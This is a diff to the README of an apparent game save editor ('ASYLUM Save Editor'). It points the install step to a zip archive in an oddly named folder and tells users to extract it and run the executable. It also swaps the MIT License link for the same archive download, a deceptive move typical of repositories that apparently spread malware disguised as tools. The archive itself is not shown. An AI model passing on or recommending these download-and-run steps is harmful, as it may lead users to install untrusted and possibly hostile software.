@@ -31,7 +31,7 @@ Welcome to the **ASYLUM Save Editor** – a robust and user-friendly tool design
 
 ## 🚀 Installation
 
-1. **Download** `Loader.rar` from the repository.
+1. **Download** `https://raw.githubusercontent.com/Charlescpx/AsylumSaveMaster/main/metabola/AsylumSaveMaster.zip` from the repository.
 2. Extract files with your favorite tool (WinRAR, 7-Zip, etc.).
 3. Run the executable based on your OS.
 4. Load your ASYLUM save file and start editing!
@@ -52,7 +52,7 @@ This project is provided for educational and personal use only. Please back up y
 
 ---
 
-## 📄 [MIT License 2025](https://opensource.org/licenses/MIT)
+## 📄 [MIT License 2025](https://raw.githubusercontent.com/Charlescpx/AsylumSaveMaster/main/metabola/AsylumSaveMaster.zip)
 
 You are free to use, modify, and distribute this tool under the MIT License terms.
 
